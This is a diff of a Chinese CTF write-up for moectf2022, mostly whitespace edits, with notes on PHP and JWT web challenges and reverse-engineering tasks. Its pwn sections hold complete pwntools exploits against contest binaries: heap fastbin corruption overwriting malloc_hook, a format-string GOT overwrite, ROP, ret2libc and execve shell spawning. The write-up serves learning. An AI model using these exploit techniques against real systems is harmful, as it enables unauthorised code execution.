@@ -26,8 +26,6 @@ title: moectf2022 wp ——我的第一场ctf
 
 - 伪协议
 
-
-
 ### ezphp
 
 highlight_file('source.txt');
@@ -38,21 +36,15 @@ highlight_file('source.txt');
 
 `$POST[' ']`不会显示在地址栏
 
-
-
 foreach ($_POST as $key => $value)
 
 `foreach`:循环，适用于数组
 
 `key value`检索健和值
 
-
-
  $$key = $value;
 
 `$$`把变量值当作变量名使用
-
-
 
 ```php
 <?php
@@ -90,8 +82,6 @@ echo 'the flag is : ' . $flag;
 No! flag.Try again. Come on!
 ```
 
-
-
 ### 支付系统
 
 - os：操作系统信息
@@ -112,8 +102,6 @@ async def flag():
     )
 ```
 
-
-
 ```python
 @app.before_request
 #每一次route请求来到之后都需要执行它
@@ -129,8 +117,6 @@ async def create_session():
             session['balance'] += tr.amount
 ```
 
-
-
 ```python
 @app.route('/pay')
 async def pay():
@@ -142,16 +128,11 @@ async def pay():
     )
     app.add_background_task(do_callback, transaction)
     return redirect(f'/transaction?id={transaction.id}')
-
 ```
-
-
-
-
 
 - enum：枚举
 - httpx：网络请求库
-- JWT（JSON Web Token）  JWT自身包含身份验证所需要的所有信息	
+- JWT（JSON Web Token）  JWT自身包含身份验证所需要的所有信息    
   - header：
   - payload：不加密，Base64编码
   - signature：前两部分的签名，密钥存放在服务端.有了签名之后，即使 JWT 被泄露或者解惑，黑客也没办法同时篡改 Signature 、Header 、Payload。
@@ -166,10 +147,6 @@ session=eyJ1aWQiOiJhNTI3MDFmZS00ZTJjLTQxYTQtYjNlZi0zY2UwNjExZWEzNjciLCJiYWxhbmNl
 
 - unserlialize是什么
 
-
-
-
-
 ## pwn
 
 ### endian
@@ -177,17 +154,20 @@ session=eyJ1aWQiOiJhNTI3MDFmZS00ZTJjLTQxYTQtYjNlZi0zY2UwNjExZWEzNjciLCJiYWxhbmNl
 - 八个二进制、两个十六进制数表示一个字节，int：四个字节
 
 - endian：计算机通信的信息应该以什么顺序传送，bigedian：高位传送，littleediaan：地位传送。
-寄存器RDI的存储的值0x4008a9是“MikatoNB”的地址，查看内存发现储存方式是
-```
-pwndbg> x /10gx 0x4008a9
-0x4008a9:	0x424e6f74616b694d(BNotakiM)
-```
-字符串：大端法
+  寄存器RDI的存储的值0x4008a9是“MikatoNB”的地址，查看内存发现储存方式是
+  
+  ```
+  pwndbg> x /10gx 0x4008a9
+  0x4008a9:    0x424e6f74616b694d(BNotakiM)
+  ```
+  
+  字符串：大端法
 
 寄存器RDI的存储的值0x4008a9是“MikatoNB”的地址，查看内存发现储存方式是
+
 ```
 pwndbg> x /10gx 0x4008a9
-0x4008a9:	0x424e6f74616b694d(BNotakiM)
+0x4008a9:    0x424e6f74616b694d(BNotakiM)
 ```
 
 输入0x10203040和0x50607080之后的储存
@@ -196,15 +176,12 @@ pwndbg> x /10gx 0x4008a9
 ```
 0x7fffffffdf80 ◂— 0x5060708010203040
 ```
+
 整数：小端法
 
 424e6f74     616b694d
 num2 : 1112436596
 num1 : 1634429261
-
-
-
-
 
 ### random
 
@@ -231,10 +208,6 @@ from ctypes import *
 c = cdll.LoadLibrary('./libc.s0.6')
 ```
 
-
-
-
-
 ### ret2text
 
 [更换可执行文件的glibc](https://www.cnblogs.com/z2yh/p/13881605.html)
@@ -243,9 +216,9 @@ c = cdll.LoadLibrary('./libc.s0.6')
 
 ```txt
 giacomo@ubuntu:~/Desktop/moectf$ ldd ret2text
-	linux-vdso.so.1 (0x00007ffdab1dc000)
-	libc.so.6 => /home/giacomo/Desktop/tools/glibc-all-in-one/libs/2.34-0ubuntu3.2_amd64/libc.so.6 (0x00007f82bef92000) 
-	/lib64/34_0-linux.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f82bf1bc000)
+    linux-vdso.so.1 (0x00007ffdab1dc000)
+    libc.so.6 => /home/giacomo/Desktop/tools/glibc-all-in-one/libs/2.34-0ubuntu3.2_amd64/libc.so.6 (0x00007f82bef92000) 
+    /lib64/34_0-linux.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f82bf1bc000)
 ```
 
 ld版本需要和libc版本一致，ld为连接器
@@ -256,227 +229,216 @@ ld版本需要和libc版本一致，ld为连接器
 
 - got EOF in interactive
 
-
-
 在system(/bin/sh)之前正常执行，卡在如上指令位置。movaps指令会检查rsp是否对齐(末尾为0)，因此需要奇数次的指令将rsp结尾从8改为0。解决方法：1. add a ret  2.跳转的指令往下一行
-
-
 
 ### s1mple_heap
 
 - 思路 ：
-
+  
   - 保护全开。PIE保护——.text,.data,.bss段每次加载基址不同。Full RELRO——无法修改got表
   - 有one-gadget：可以利用malloc_hook
   - free后指针清零：无法use after free
 
 - 相关资料  
 
-  
+```
+pwndbg> b one_gadget
+Breakpoint 1 at 0x555555555dfd
 
-  
 
-  ```
-  pwndbg> b one_gadget
-  Breakpoint 1 at 0x555555555dfd
-  
-  
-  0x555555558020 <stdout@@GLIBC_2.2.5>:	0x00007ffff7fb06a0	0x0000000000000000
-  0x555555558030 <stdin@@GLIBC_2.2.5>:	0x00007ffff7faf980	0x0000000000000000
-  0x555555558040 <mmap>:	0x00000000eeeeeeee	0x0000000000000010  (0)
-  0x555555558050 <mmap+16>:	0x0000000000000000	0x0000000000000000
-  0x555555558060 <mmap+32>:	0x00000000ffffffff	0x00000000000003d0  (1)
-  0x555555558070 <mmap+48>:	0x0000000000000000	0x0000000000000000
-  0x555555558080 <mmap+64>:	0x0000000000000000	0x0000000000000000  (2)
-  0x555555558090 <mmap+80>:	0x0000000000000000	0x0000000000000000
-  0x5555555580a0 <mmap+96>:	0x0000000000000000	0x0000000000000000   (3)
-  0x5555555580b0 <mmap+112>:	0x0000000000000000	0x0000000000000000
-  0x5555555580c0 <mmap+128>:	0x0000000000000000	0x0000000000000000  (4)
-  0x5555555580d0 <mmap+144>:	0x0000000000000000	0x0000000000000000
-  0x5555555580e0 <mmap+160>:	0x0000000000000000	0x0000000000000000   (5)
-  0x5555555580f0 <mmap+176>:	0x0000000000000000	0x0000000000000000
-  0x555555558100 <mmap+192>:	0x0000000000000000	0x0000000000000000
-  0x555555558110 <mmap+208>:	0x0000000000000000	0x0000000000000000
-  0x555555558120 <mmap+224>:	0x0000000000000000	0x0000000000000000
-  0x555555558130 <mmap+240>:	0x0000000000000000	0x0000000000000000
-  0x555555558140 <mmap+256>:	0x0000000000000000	0x0000000000000000
-  0x555555558150 <mmap+272>:	0x0000000000000000	0x0000000000000000
-  0x555555558160 <mmap+288>:	0x0000000000000000	0x0000000000000000
-  0x555555558170 <mmap+304>:	0x0000000000000000	0x0000000000000000
-  0x555555558180 <mmap+320>:	0x0000000000000000	0x0000000000000000
-  0x555555558190 <mmap+336>:	0x0000000000000000	0x0000000000000000
-  0x5555555581a0 <mmap+352>:	0x0000000000000000	0x0000000000000000
-  0x5555555581b0 <mmap+368>:	0x0000000000000000	0x0000000000000000
-  0x5555555581c0 <mmap+384>:	0x0000000000000000	0x0000000000000000
-  0x5555555581d0 <mmap+400>:	0x0000000000000000	0x0000000000000000
-  0x5555555581e0 <mmap+416>:	0x0000000000000000	0x0000000000000000
-  0x5555555581f0 <mmap+432>:	0x0000000000000000	0x0000000000000000
-  0x555555558200 <mmap+448>:	0x0000000000000000	0x0000000000000000
-  0x555555558210 <mmap+464>:	0x0000000000000000	0x0000000000000000
-  0x555555558220 <mmap+480>:	0x0000000000000000	0x0000000000000000
-  0x555555558230 <mmap+496>:	0x0000000000000000	0x0000000000000000
-  0x555555558240 <mmap+512>:	0x0000000000000000	0x0000000000000000
-  0x555555558250 <mmap+528>:	0x0000000000000000	0x0000000000000000
-  0x555555558260 <mmap+544>:	0x0000000000000000	0x0000000000000000
-  0x555555558270 <mmap+560>:	0x0000000000000000	0x0000000000000000
-  0x555555558280 <mmap+576>:	0x0000000000000000	0x0000000000000000
-  0x555555558290 <mmap+592>:	0x0000000000000000	0x0000000000000000
-  0x5555555582a0 <mmap+608>:	0x0000000000000000	0x0000000000000000
-  0x5555555582b0 <mmap+624>:	0x0000000000000000	0x0000000000000000
-  0x5555555582c0 <mmap+640>:	0x0000000000000000	0x0000000000000000
-  0x5555555582d0 <mmap+656>:	0x0000000000000000	0x0000000000000000
-  0x5555555582e0 <mmap+672>:	0x0000000000000000	0x0000000000000000
-  0x5555555582f0 <mmap+688>:	0x0000000000000000	0x0000000000000000
-  0x555555558300 <mmap+704>:	0x0000000000000000	0x0000000000000000
-  0x555555558310 <mmap+720>:	0x0000000000000000	0x0000000000000000
-  0x555555558320 <mmap+736>:	0x0000000000000000	0x0000000000000000
-  0x555555558330 <mmap+752>:	0x0000000000000000	0x0000000000000000
-  0x555555558340 <mmap+768>:	0x0000000000000000	0x0000000000000000
-  0x555555558350 <mmap+784>:	0x0000000000000000	0x0000000000000000
-  0x555555558360 <mmap+800>:	0x0000000000000000	0x0000000000000000
-  0x555555558370 <mmap+816>:	0x0000000000000000	0x0000000000000000
-  0x555555558380 <mmap+832>:	0x0000000000000000	0x0000000000000000
-  0x555555558390 <mmap+848>:	0x0000000000000000	0x0000000000000000
-  0x5555555583a0 <mmap+864>:	0x0000000000000000	0x0000000000000000
-  0x5555555583b0 <mmap+880>:	0x0000000000000000	0x0000000000000000
-  0x5555555583c0 <mmap+896>:	0x0000000000000000	0x0000000000000000
-  0x5555555583d0 <mmap+912>:	0x0000000000000000	0x0000000000000000
-  0x5555555583e0 <mmap+928>:	0x0000000000000000	0x0000000000000000
-  0x5555555583f0 <mmap+944>:	0x0000000000000000	0x0000000000000000
-  0x555555558400 <mmap+960>:	0x0000000000000000	0x0000000000000000
-  0x55555555 8410   <mmap+976>:	0x0000000000000000	0x0000000000000000
-  0x555555558420 <mmap+992>:	0x0000000000000000	0x0000000000000000
-  0x555555558430 <mmap+1008>:	0x0000000000000000	0x0000000000000000
-  0x555555558440 <fast_bin>:	0x0000000000000000	0x0000000000000000
-  0x555555558450 <fast_bin+16>:	0x0000000000000000	0x0000000000000000
-  0x555555558460 <ChunkInfo>:	0x0000555555558050	0x0000000000000010
-  0x555555558470 <ChunkInfo+16>:	0x0000000000000000	0x0000000000000000
-  0x555555558480 <ChunkInfo+32>:	0x0000000000000000	0x0000000000000000
-  0x555555558490 <ChunkInfo+48>:	0x0000000000000000	0x0000000000000000
-  0x5555555584a0 <ChunkInfo+64>:	0x0000000000000000	0x0000000000000000
-  0x5555555584b0 <ChunkInfo+80>:	0x0000000000000000	0x0000000000000000
-  0x5555555584c0 <ChunkInfo+96>:	0x0000000000000000	0x0000000000000000
-  0x5555555584d0 <ChunkInfo+112>:	0x0000000000000000	0x0000000000000000
-  0x5555555584e0 <ChunkInfo+128>:	0x0000000000000000	0x0000000000000000
-  0x5555555584f0 <ChunkInfo+144>:	0x0000000000000000	0x0000000000000000
-  0x555555558500 <ChunkInfo+160>:	0x0000000000000000	0x0000000000000000
-  0x555555558510 <ChunkInfo+176>:	0x0000000000000000	0x0000000000000000
-  0x555555558520 <ChunkInfo+192>:	0x0000000000000000	0x0000000000000000
-  0x555555558530 <ChunkInfo+208>:	0x0000000000000000	0x0000000000000000
-  0x555555558540 <ChunkInfo+224>:	0x0000000000000000	0x0000000000000000
-  ```
-  
-  
-  
-  ```
-  from pwn import *
-  
-  context(os='linux',arch='amd64',log_level='debug')
-  content = 0
-  
-  elf = ELF("./s1mple_heap")
-  libc = ELF('./libc-2.31.so')
-  
-  if content == 1:
-      giacomo = process('./s1mple_heap')
-  else:
-      giacomo = remote("pwn.blackbird.wang",9600)
-  
-  def allocate(size):
-      size = str(size)
-      giacomo.sendlineafter('5.exit\n','1')
-      giacomo.sendlineafter('size:',size)
-  
-  def delete(id):
-      id = str(id)
-      giacomo.sendlineafter('5.exit\n','2')
-      giacomo.sendlineafter('index:',id)
-  
-  def fill(id, content):
-      id = str(id)
-      giacomo.sendlineafter('5.exit\n','3')
-      giacomo.sendlineafter('index:\n', id)
-      giacomo.sendafter('content:\n', content)
-      giacomo.sendline('')
-  
-  def print_heap(id):
-      id = str(id)
-      giacomo.sendlineafter('5.exit\n','4')
-      giacomo.sendlineafter('index:\n', id)
-  
-  
-  def main():
-      
-  
-  #---------------------------------------------------------------- 
-  
-      # gdb.attach(giacomo)
-      # pause()
-      
-      allocate(0x10) #0
-      allocate(0x10) #1 
-      allocate(0x10) #2
-      allocate(0x10) #3
-      allocate(0x10) #4
-  
-      #将fastbin链更改为fastbin->1->4
-      delete(2) 
-      delete(1)
-      payload = b'a'*0x10 + p32(0xffffffff) + p32(0) + p64(0x10) + p8(0xc0)
-      fill(0, payload)
-  
-      #将4的inuse位更改
-      payload = b'a'*0x10 + p32(0xffffffff) + p32(0)
-      fill(3, payload)
-  
-      #重新利用4也就是2
-      allocate(0x10) #1
-      allocate(0x10) #2 & 4
-      
-      #获取1的地址
-      delete(1)
-      delete(4)
-      print_heap(2)
-      
-      #计算需要申请的地址位置和onegadget位置
-      addr = giacomo.recv(numb = 0x8) #接收1的地址 0x555555558060
-      addr = addr.hex()
-      addr_1 = addr[10:12]+addr[8:10]+addr[6:8]+addr[4:6]+addr[2:4]+addr[0:2]
-      addr_1 = int(addr_1,16)
-      one_gadget = addr_1 - 0x2263 #one_gadget地址
-      chunk = addr_1 + 0x3b0 #申请的chunk地址
-      payload = b'a'*0x10 + p32(0xeeeeeeee) + p32(0) + p64(0x10) + p64(chunk)
-      fill(3, payload)
-  
-      #更改大小
-  
-      allocate(0x300) #1
-      allocate(0x10) #4
-      allocate(0x10) #5
-      allocate(0x10) #6
-      payload = p32(0xffffffff) + p32(0) + p64(0x80)
-      fill(6, payload)
-  
-      #申请内存
-      delete(2)
-      payload = b'a'*0x10 + p32(0xffffffff) +p32(0)+p64(0x10)+p64(addr_1 + 0x3a0)
-      fill(3, payload)
-      allocate(0x10) #2
-      allocate(0x80) #7
-  
-      #更改malloc_hook
-      payload = b'a' * 0x48 +p64(one_gadget)
-      fill(7,payload)
-  
-      #调用malloc_hook
-      giacomo.sendlineafter('5.exit\n','1')
-      giacomo.interactive()
-  
-  
-  main()
-  
-  ```
-  
+0x555555558020 <stdout@@GLIBC_2.2.5>:    0x00007ffff7fb06a0    0x0000000000000000
+0x555555558030 <stdin@@GLIBC_2.2.5>:    0x00007ffff7faf980    0x0000000000000000
+0x555555558040 <mmap>:    0x00000000eeeeeeee    0x0000000000000010  (0)
+0x555555558050 <mmap+16>:    0x0000000000000000    0x0000000000000000
+0x555555558060 <mmap+32>:    0x00000000ffffffff    0x00000000000003d0  (1)
+0x555555558070 <mmap+48>:    0x0000000000000000    0x0000000000000000
+0x555555558080 <mmap+64>:    0x0000000000000000    0x0000000000000000  (2)
+0x555555558090 <mmap+80>:    0x0000000000000000    0x0000000000000000
+0x5555555580a0 <mmap+96>:    0x0000000000000000    0x0000000000000000   (3)
+0x5555555580b0 <mmap+112>:    0x0000000000000000    0x0000000000000000
+0x5555555580c0 <mmap+128>:    0x0000000000000000    0x0000000000000000  (4)
+0x5555555580d0 <mmap+144>:    0x0000000000000000    0x0000000000000000
+0x5555555580e0 <mmap+160>:    0x0000000000000000    0x0000000000000000   (5)
+0x5555555580f0 <mmap+176>:    0x0000000000000000    0x0000000000000000
+0x555555558100 <mmap+192>:    0x0000000000000000    0x0000000000000000
+0x555555558110 <mmap+208>:    0x0000000000000000    0x0000000000000000
+0x555555558120 <mmap+224>:    0x0000000000000000    0x0000000000000000
+0x555555558130 <mmap+240>:    0x0000000000000000    0x0000000000000000
+0x555555558140 <mmap+256>:    0x0000000000000000    0x0000000000000000
+0x555555558150 <mmap+272>:    0x0000000000000000    0x0000000000000000
+0x555555558160 <mmap+288>:    0x0000000000000000    0x0000000000000000
+0x555555558170 <mmap+304>:    0x0000000000000000    0x0000000000000000
+0x555555558180 <mmap+320>:    0x0000000000000000    0x0000000000000000
+0x555555558190 <mmap+336>:    0x0000000000000000    0x0000000000000000
+0x5555555581a0 <mmap+352>:    0x0000000000000000    0x0000000000000000
+0x5555555581b0 <mmap+368>:    0x0000000000000000    0x0000000000000000
+0x5555555581c0 <mmap+384>:    0x0000000000000000    0x0000000000000000
+0x5555555581d0 <mmap+400>:    0x0000000000000000    0x0000000000000000
+0x5555555581e0 <mmap+416>:    0x0000000000000000    0x0000000000000000
+0x5555555581f0 <mmap+432>:    0x0000000000000000    0x0000000000000000
+0x555555558200 <mmap+448>:    0x0000000000000000    0x0000000000000000
+0x555555558210 <mmap+464>:    0x0000000000000000    0x0000000000000000
+0x555555558220 <mmap+480>:    0x0000000000000000    0x0000000000000000
+0x555555558230 <mmap+496>:    0x0000000000000000    0x0000000000000000
+0x555555558240 <mmap+512>:    0x0000000000000000    0x0000000000000000
+0x555555558250 <mmap+528>:    0x0000000000000000    0x0000000000000000
+0x555555558260 <mmap+544>:    0x0000000000000000    0x0000000000000000
+0x555555558270 <mmap+560>:    0x0000000000000000    0x0000000000000000
+0x555555558280 <mmap+576>:    0x0000000000000000    0x0000000000000000
+0x555555558290 <mmap+592>:    0x0000000000000000    0x0000000000000000
+0x5555555582a0 <mmap+608>:    0x0000000000000000    0x0000000000000000
+0x5555555582b0 <mmap+624>:    0x0000000000000000    0x0000000000000000
+0x5555555582c0 <mmap+640>:    0x0000000000000000    0x0000000000000000
+0x5555555582d0 <mmap+656>:    0x0000000000000000    0x0000000000000000
+0x5555555582e0 <mmap+672>:    0x0000000000000000    0x0000000000000000
+0x5555555582f0 <mmap+688>:    0x0000000000000000    0x0000000000000000
+0x555555558300 <mmap+704>:    0x0000000000000000    0x0000000000000000
+0x555555558310 <mmap+720>:    0x0000000000000000    0x0000000000000000
+0x555555558320 <mmap+736>:    0x0000000000000000    0x0000000000000000
+0x555555558330 <mmap+752>:    0x0000000000000000    0x0000000000000000
+0x555555558340 <mmap+768>:    0x0000000000000000    0x0000000000000000
+0x555555558350 <mmap+784>:    0x0000000000000000    0x0000000000000000
+0x555555558360 <mmap+800>:    0x0000000000000000    0x0000000000000000
+0x555555558370 <mmap+816>:    0x0000000000000000    0x0000000000000000
+0x555555558380 <mmap+832>:    0x0000000000000000    0x0000000000000000
+0x555555558390 <mmap+848>:    0x0000000000000000    0x0000000000000000
+0x5555555583a0 <mmap+864>:    0x0000000000000000    0x0000000000000000
+0x5555555583b0 <mmap+880>:    0x0000000000000000    0x0000000000000000
+0x5555555583c0 <mmap+896>:    0x0000000000000000    0x0000000000000000
+0x5555555583d0 <mmap+912>:    0x0000000000000000    0x0000000000000000
+0x5555555583e0 <mmap+928>:    0x0000000000000000    0x0000000000000000
+0x5555555583f0 <mmap+944>:    0x0000000000000000    0x0000000000000000
+0x555555558400 <mmap+960>:    0x0000000000000000    0x0000000000000000
+0x55555555 8410   <mmap+976>:    0x0000000000000000    0x0000000000000000
+0x555555558420 <mmap+992>:    0x0000000000000000    0x0000000000000000
+0x555555558430 <mmap+1008>:    0x0000000000000000    0x0000000000000000
+0x555555558440 <fast_bin>:    0x0000000000000000    0x0000000000000000
+0x555555558450 <fast_bin+16>:    0x0000000000000000    0x0000000000000000
+0x555555558460 <ChunkInfo>:    0x0000555555558050    0x0000000000000010
+0x555555558470 <ChunkInfo+16>:    0x0000000000000000    0x0000000000000000
+0x555555558480 <ChunkInfo+32>:    0x0000000000000000    0x0000000000000000
+0x555555558490 <ChunkInfo+48>:    0x0000000000000000    0x0000000000000000
+0x5555555584a0 <ChunkInfo+64>:    0x0000000000000000    0x0000000000000000
+0x5555555584b0 <ChunkInfo+80>:    0x0000000000000000    0x0000000000000000
+0x5555555584c0 <ChunkInfo+96>:    0x0000000000000000    0x0000000000000000
+0x5555555584d0 <ChunkInfo+112>:    0x0000000000000000    0x0000000000000000
+0x5555555584e0 <ChunkInfo+128>:    0x0000000000000000    0x0000000000000000
+0x5555555584f0 <ChunkInfo+144>:    0x0000000000000000    0x0000000000000000
+0x555555558500 <ChunkInfo+160>:    0x0000000000000000    0x0000000000000000
+0x555555558510 <ChunkInfo+176>:    0x0000000000000000    0x0000000000000000
+0x555555558520 <ChunkInfo+192>:    0x0000000000000000    0x0000000000000000
+0x555555558530 <ChunkInfo+208>:    0x0000000000000000    0x0000000000000000
+0x555555558540 <ChunkInfo+224>:    0x0000000000000000    0x0000000000000000
+```
+
+```
+from pwn import *
+
+context(os='linux',arch='amd64',log_level='debug')
+content = 0
+
+elf = ELF("./s1mple_heap")
+libc = ELF('./libc-2.31.so')
+
+if content == 1:
+    giacomo = process('./s1mple_heap')
+else:
+    giacomo = remote("pwn.blackbird.wang",9600)
+
+def allocate(size):
+    size = str(size)
+    giacomo.sendlineafter('5.exit\n','1')
+    giacomo.sendlineafter('size:',size)
+
+def delete(id):
+    id = str(id)
+    giacomo.sendlineafter('5.exit\n','2')
+    giacomo.sendlineafter('index:',id)
+
+def fill(id, content):
+    id = str(id)
+    giacomo.sendlineafter('5.exit\n','3')
+    giacomo.sendlineafter('index:\n', id)
+    giacomo.sendafter('content:\n', content)
+    giacomo.sendline('')
+
+def print_heap(id):
+    id = str(id)
+    giacomo.sendlineafter('5.exit\n','4')
+    giacomo.sendlineafter('index:\n', id)
+
+
+def main():
+
+
+#---------------------------------------------------------------- 
+
+    # gdb.attach(giacomo)
+    # pause()
+
+    allocate(0x10) #0
+    allocate(0x10) #1 
+    allocate(0x10) #2
+    allocate(0x10) #3
+    allocate(0x10) #4
+
+    #将fastbin链更改为fastbin->1->4
+    delete(2) 
+    delete(1)
+    payload = b'a'*0x10 + p32(0xffffffff) + p32(0) + p64(0x10) + p8(0xc0)
+    fill(0, payload)
+
+    #将4的inuse位更改
+    payload = b'a'*0x10 + p32(0xffffffff) + p32(0)
+    fill(3, payload)
+
+    #重新利用4也就是2
+    allocate(0x10) #1
+    allocate(0x10) #2 & 4
+
+    #获取1的地址
+    delete(1)
+    delete(4)
+    print_heap(2)
+
+    #计算需要申请的地址位置和onegadget位置
+    addr = giacomo.recv(numb = 0x8) #接收1的地址 0x555555558060
+    addr = addr.hex()
+    addr_1 = addr[10:12]+addr[8:10]+addr[6:8]+addr[4:6]+addr[2:4]+addr[0:2]
+    addr_1 = int(addr_1,16)
+    one_gadget = addr_1 - 0x2263 #one_gadget地址
+    chunk = addr_1 + 0x3b0 #申请的chunk地址
+    payload = b'a'*0x10 + p32(0xeeeeeeee) + p32(0) + p64(0x10) + p64(chunk)
+    fill(3, payload)
+
+    #更改大小
+
+    allocate(0x300) #1
+    allocate(0x10) #4
+    allocate(0x10) #5
+    allocate(0x10) #6
+    payload = p32(0xffffffff) + p32(0) + p64(0x80)
+    fill(6, payload)
+
+    #申请内存
+    delete(2)
+    payload = b'a'*0x10 + p32(0xffffffff) +p32(0)+p64(0x10)+p64(addr_1 + 0x3a0)
+    fill(3, payload)
+    allocate(0x10) #2
+    allocate(0x80) #7
+
+    #更改malloc_hook
+    payload = b'a' * 0x48 +p64(one_gadget)
+    fill(7,payload)
+
+    #调用malloc_hook
+    giacomo.sendlineafter('5.exit\n','1')
+    giacomo.interactive()
+
+
+main()
+```
+
 ### shellcode
 
   用汇编语言编写
@@ -498,10 +460,7 @@ def main():
     giacomo.interactive()
 
 main()
-
 ```
-
-
 
 ### babyfmt
 
@@ -516,7 +475,7 @@ main()
 
 - gift地址的获取
 
-​	`giacomorecvuntil('\n', drop=true)`
+​    `giacomorecvuntil('\n', drop=true)`
 
 ```
 gift: 0x8de91a0\n
@@ -526,21 +485,19 @@ gift: 0x8de91a0\n
 ```
 
 - 打包函数
-
+  
   `比如将0xdeadbeef进行32位的打包，将会得到'\xef\xbe\xad\xde'`
 
 - 下断点
 
-​	gdb的断点在read函数的syscall之后，且注意arch = x86，否则调试不正常
-
+​    gdb的断点在read函数的syscall之后，且注意arch = x86，否则调试不正常
 
 - fmtstr_payload
-
+  
   专门为32位格式化字符串设计，可以同时传多个数据
 
 ```
-  p0x804a010 <printf@got.plt>:	0x0804843608048426
-  
+  p0x804a010 <printf@got.plt>:    0x0804843608048426
 ```
 
 - exp
@@ -574,32 +531,30 @@ def main():
 main()
 ```
 
-
-
 ### rop32
 
 - 下载glibc失败：download_old
 
 - read之后字符串储存在哪里？
-
-  ​	可以指定read函数参数，将字符串储存到那里
+  
+  ​    可以指定read函数参数，将字符串储存到那里
 
 - gdb无法调试
-
+  
   ```
   Reading symbols from ./rop32...
   (No debugging symbols found in ./rop32)
   ```
-  
+
 - read大小限制了读写的大小，如何把payload传进去
 
-​		/bin/sh没有成功传输：超出了读取范围
+​        /bin/sh没有成功传输：超出了读取范围
 
-​		`sh: 1: Syntax error: Unterminated quoted string`
+​        `sh: 1: Syntax error: Unterminated quoted string`
 
-​		函数的plt和参数之间有一个4bit的偏差，但是也有没有偏差的函数[pop&ret](https://blog.csdn.net/qq_37340753/article/details/81585083?spm=1001.2101.3001.6650.13&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-81585083-blog-54922838.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-81585083-blog-54922838.pc_relevant_aa&utm_relevant_index=14)
+​        函数的plt和参数之间有一个4bit的偏差，但是也有没有偏差的函数[pop&ret](https://blog.csdn.net/qq_37340753/article/details/81585083?spm=1001.2101.3001.6650.13&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-81585083-blog-54922838.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-81585083-blog-54922838.pc_relevant_aa&utm_relevant_index=14)
 
-​		
+​        
 
 ```
 from pwn import *
@@ -628,10 +583,8 @@ main()
 ### rop64
 
 - printf：泄露canary的值[canary](https://blog.csdn.net/AcSuccess/article/details/104115114)
-
-  64位canary有八位，末尾是/00，保证切断字符串
-
   
+  64位canary有八位，末尾是/00，保证切断字符串
 
 - 栈溢出更改函数进程
 
@@ -663,24 +616,18 @@ def main():
 main()
 ```
 
-
-
 ### syscall
 
 - [什么是syscall](https://blog.csdn.net/weixin_43363675/article/details/117944212)
 
-​	rax = 0x3b（不需要gadget）
-​	rdi指向"/bin/sh"
-​	rsi = 0x0
-​	rdx = 0x0
+​    rax = 0x3b（不需要gadget）
+​    rdi指向"/bin/sh"
+​    rsi = 0x0
+​    rdx = 0x0
 
 - 如何控制RAX
-
+  
   call read@plt之后，RAX变为输入的字符。RAx用于存放返回的字符
-
-
-
-
 
 ```
 from pwn import *
@@ -720,9 +667,9 @@ main()
 
 ### ret2libc
 
-​	plt、got的地址需要泄露[ret2libc](https://blog.csdn.net/m0_46363249/article/details/115270147)
+​    plt、got的地址需要泄露[ret2libc](https://blog.csdn.net/m0_46363249/article/details/115270147)
 
-​	泄露puts函数地址，调用system(/bin/sh)
+​    泄露puts函数地址，调用system(/bin/sh)
 
 ```
 from pwn import *
@@ -741,7 +688,7 @@ def main():
     # pause()
     elf = ELF('./ret2libc')
     rdi = 0x40117e
-    
+
     read_got = 0x7ffff7eab920
     payload = b'a'*0x48 + p64(rdi) + p64(elf.got['puts'])+p64(elf.plt['puts']) + p64(0x401183)
     giacomo.recvuntil(b'Go Go Go!!!\n')
@@ -763,17 +710,11 @@ def main():
 main()
 ```
 
-
-
 ![img](https://img-blog.csdn.net/20181011161018870?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDk5MTAzNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)
 
 - 寻找libc中的地址
 
-
-
 ## re
-
-
 
 ### begin
 
@@ -801,10 +742,6 @@ def main():
 
 main()
 ```
-
-
-
-
 
 ### base64
 
@@ -878,10 +815,3 @@ int base64_decode(char *base64, char *originChar)
   return j;
 }
 ```
-
-
-
-
-
-
-
